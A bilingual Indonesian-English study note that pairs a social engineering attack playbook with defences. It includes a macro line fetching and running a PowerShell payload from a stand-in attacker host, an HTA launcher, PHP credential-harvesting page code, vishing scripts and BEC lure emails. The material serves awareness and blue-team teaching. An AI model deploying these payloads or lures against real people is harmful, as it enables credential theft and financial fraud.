---
title: Lengkap — Social Engineering Attack Playbook & Defense
tags:
- vault
- note
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---


cssclasses:
  - wide-table
  

## Deepdive Lengkap — Social Engineering Attack Playbook & Defense

### 1. Attack Chain Framework (Social Engineering)

```
Recon → Weaponization → Delivery → Exploitation → Installation → C2 → Actions
```

| Phase | Aktivitas | Example |
|-------|-----------|---------|
| **Recon** | OSINT target (org chart, email format, tech stack) | LinkedIn, Hunter.io |
| **Weaponization** | Craft payload (phish page, malicious doc, USB) | GoPhish, Evilginx |
| **Delivery** | Send via email, SMS, call, USB drop | SMTP, Twilio, physical |
| **Exploitation** | User action (click, open, enable macro) | Credential harvest |
| **Installation** | Malware/RAT deploy | Meterpreter, Sliver |
| **C2** | Command & control | Cobalt Strike, custom |
| **Actions** | Data exfil, lateral, persist | Rclone, ransomware |

### 2. Teknik Detail & Varian

#### 2.1 Phishing (Mass vs Targeted)

| Variant | Target | Personalization | Success Rate | Tool |
|---------|--------|-----------------|--------------|------|
| **Bulk Phishing** | Thousand | None (generic) | 1-5% | GoPhish, SET |
| **Spear Phishing** | Individual/Group | High (OSINT-based) | 20-50% | Custom |
| **Whaling** | C-Level | Very high (exec profile) | 30-70% | Custom |
| **Clone Phishing** | Existing thread | Clone legit email | 40-60% | Email client |
| **HTTPS Phishing** | Valid cert (Let's Encrypt) | Lookalike domain | 30-50% | Evilginx |

#### 2.2 Vishing (Voice Phishing) Script Pattern

```
Pretext: "IT Support / Bank Security / Vendor / Government"
Urgency: "Account compromised / Deadline today / Audit tomorrow"
Authority: "Saya dari tim keamanan, ID pegawai: XXX"
Action: "Verifikasi OTP / Klik link / Install app / Transfer"
Pressure: "Jika tidak, akun dikunci / Denda / Hukuman"
```

**Counter**: "Saya akan hubungi balik melalui nomor resmi."

#### 2.3 Pretexting Scenario

| Pretext | Scenario | Info Diminati |
|---------|----------|---------------|
| **IT Support** | "Reset password, perlu verifikasi" | Password, MFA code |
| **Vendor** | "Invoice update, butuh PO terbaru" | Financial doc |
| **HR** | "Update data karyawan, butuh KTP" | PII |
| **Audit** | "Compliance check, share access" | Credential, VPN |
| **New Hire** | "Onboarding, butuh akses sistem" | VPN, repo access |

#### 2.4 Physical (USB Drop, Tailgating)

| Method | Bahan | Payload |
|--------|-------|---------|
| **USB Drop** | Branded USB, "Salary 2024", "Confidential" | Rubber Ducky, BadUSB |
| **Tailgating** | "Lupa badge, tolong buka" | Physical access |
| **Badge Clone** | RFID cloner (Proxmark3) | Cloned badge |

### 3. Payload Delivery Technical

#### 3.1 Evilginx3 (Phishlet Framework)

```
1. Setup: evilginx -config ./phishlets/
2. Target: Microsoft 365 phishlet
3. Lure: Send link → user login → session cookie captured
4. Session: Cookie → reuse tanpa MFA (session hijack)
```

#### 3.2 Macro Document (Office)

```vba
AutoOpen():
  Shell("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')")
```

**Defense**: Disable macro default, Protected View, Application Guard.

#### 3.3 HTA / HTML Application

```html
<HTA:APPLICATION ID="test" APPLICATIONNAME="test">
<script>
new ActiveXObject("WScript.Shell").Run("powershell -c ...");
</script>
```

### 4. Defense Matrix (Blue Team)

| Layer | Control | Tool/Implementation |
|-------|---------|---------------------|
| **Human** | Training, simulation | KnowBe4, GoPhish internal |
| **Email** | SPF/DKIM/DMARC, gateway | Proofpoint, Microsoft Defender |
| **Endpoint** | EDR, AppLocker, WDAC | CrowdStrike, Microsoft Defender |
| **Network** | Proxy, DNS filter, TLS inspect | Zscaler, Cisco Umbrella |
| **Identity** | MFA (phish-resistant: FIDO2), PAM | YubiKey, CyberArk |
| **Process** | Verification callback, dual approval | Finance SOP |
| **Monitoring** | UEBA, credential leak scan | Microsoft Sentinel, HaveIBeenPwned API |

### 5. Simulation Program (Red Team Internal)

```
Quarterly:
  Q1: Bulk phishing (baseline)
  Q2: Spear phishing (OSINT-based)
  Q3: Vishing + USB drop
  Q4: Whaling (C-level)

Metrics:
  - Click rate (%)
  - Credential submit rate (%)
  - Report rate (%)
  - Time to report (minutes)
  - Repeat offender (%)
```

### 6. Indonesia Context (Regulasi & Budaya)

| Aspek | Detail |
|-------|--------|
| **Regulasi** | UU ITE Ps. 28 (akses ilegal), Ps. 30 (penyadapan), UU PDP 2022 (data pribadi) |
| **Budaya** | Hierarkis → authority pressure efektif; gotong royong → pretext "bantu rekan" efektif |
| **Bahasa** | Campur Indonesia-Inggris teknis → luluhkan kecurigaan |
| **Channel** | WhatsApp (bisnis), Telegram (komunitas teknis), Email (formal) |

## Referensi
- MITRE ATT&CK T1566 — https://attack.mitre.org/techniques/T1566/
- Social-Engineer Toolkit — https://github.com/trustedsec/social-engineer-toolkit
- GoPhish — https://getgophish.com/
- Evilginx — https://github.com/kgretzky/evilginx2
- NIST SP 800-115 — https://csrc.nist.gov/publications/detail/sp/800-115/final
- CISA Phishing Guidance — https://www.cisa.gov/phishing

### 7. Case Study: BEC Attack Walkthrough

```
Target: Finance Manager di perusahaan mid-size (50 karyawan)

1. Recon: LinkedIn → CFO (nama, gaya email), finance manager (nama, jabatan)
2. Setup: daftar domain example.co (lookalike example.co.id), email server (postfix/gmail)
3. Email 1 (ke FM): "Halo [FM], ini [CFO]. Saya ada meeting investor, bisa siapkan
   transfer ke vendor baru hari ini? Detail di lampiran."
4. Email 2 (follow-up 2 jam): "Sudah dapat? Ini urgent — deadline klien."
5. Panggilan (vishing): "Ini [CFO], saya tidak bisa buka email. Tolong baca invoice di
   attachment dan eksekusi transfer ke rekening [attacker]."
6. Attachment: "INVOICE-2024-0712.pdf" (bukan macro, murni sosial) → user transfer
7. Result: uang hilang, tidak reversible (bank tidak cover BEC di banyak kasus)

Mitigasi: callback verifikasi wajib untuk transfer > threshold, dual approval.
```

### 8. Phishing Page Replication (Technical)

```html
<!-- Phish page: login.example.com (HTTPS valid via Let's Encrypt)
     Server: nginx + php, POST → attacker DB, redirect ke asli -->
<form method="POST" action="/capture">
  <input name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button>Sign In</button>
</form>
<?php
  $u = $_POST['username']; $p = $_POST['password'];
  file_put_contents('/var/log/creds.txt', "$u:$p
", FILE_APPEND);
  header('Location: https://real-site.com/login?error=1');
?>
```

**Anti-phish**: passkey (FIDO2) membuat phish page tidak berfungsi — tidak ada credential yang bisa dicuri; autofill anti-phish browser.

### 9. Quick Reference: Red Flag Indikator Phishing

| Red Flag | Deskripsi |
|----------|-----------|
| Urgency artificial | "Hari ini deadline", "Segera", "Urgent" |
| Authority impersonation | "Dari CEO", "Dari Bank", "Dari IT" |
| Generic greeting | "Dear Customer", "Hi Team" (bukan nama) |
| Poor grammar/spelling | Meski sophisticated attack bisa bagus |
| Mismatched URL | Link text beda dengan hover URL |
| Unexpected attachment | Invoice, PO, Doc yang tidak diharapkan |
| Request bypass | "Kirim via reply", "Bayar ke rekening ini" |
| Emotional pressure | "Akun akan dikunci", "Kami percaya kamu" |
---

audited
---
